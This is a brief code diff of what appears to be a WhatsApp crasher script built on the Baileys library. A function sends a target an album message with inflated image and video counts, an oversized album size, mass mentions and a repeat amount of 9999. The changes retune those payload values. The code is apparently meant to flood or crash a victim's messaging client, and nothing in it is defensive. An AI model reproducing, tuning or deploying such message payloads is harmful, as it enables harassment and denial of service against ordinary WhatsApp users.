@@ -485,7 +485,7 @@ async function F(sock, target) {
 async function AB(sock, target, mention) {
     const phynxImage = "https://files.catbox.moe/t64p42.jpg";
     const Amount = 9999;
-    const sizeAlbum = "536870912000";
+    const sizeAlbum = "5368709";
     const mentionedSize = 31111;
     const mentionedCustom = [
         "phynxagency@s.whatsapp.net",
@@ -562,8 +562,8 @@ async function AB(sock, target, mention) {
     };
     const album = await generateWAMessageFromContent(target, {
         albumMessage: {
-            expectedImageCount: 999,
-            expectedVideoCount: 666
+            expectedImageCount: 99,
+            expectedVideoCount: 66
         }
     }, {
         userJid: target,
